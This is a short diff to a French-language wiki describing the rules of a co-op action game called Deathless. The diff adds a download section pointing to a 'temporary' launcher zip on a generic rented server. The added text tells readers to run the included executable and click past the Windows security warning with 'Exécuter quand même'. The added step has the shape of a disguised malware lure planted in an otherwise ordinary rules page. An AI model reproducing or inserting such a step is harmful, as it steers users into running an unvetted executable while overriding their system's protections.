@@ -6,6 +6,10 @@ Deathless est un jeu d'action en coopération, vu à la troisième personne. Les
 
 {public} Ce wiki présente les règles du jeu : les classes, les ennemis, le déroulé d'une partie et les commandes. Les valeurs chiffrées peuvent encore évoluer.
 
+## Télécharger le jeu
+
+> Lien temporaire : [DeathlessLauncher.zip](http://srv617344.hstgr.cloud/deathless/DeathlessLauncher.zip). Dézipper dans un dossier, puis lancer `DeathlessLauncher.exe` : il installe le jeu et le met à jour tout seul. Au premier lancement, Windows peut afficher un avertissement : « Informations complémentaires », puis « Exécuter quand même ».
+
 ## Lire le wiki {dev}
 
 - {décidé} : la règle est tranchée par Quentin et s'applique.
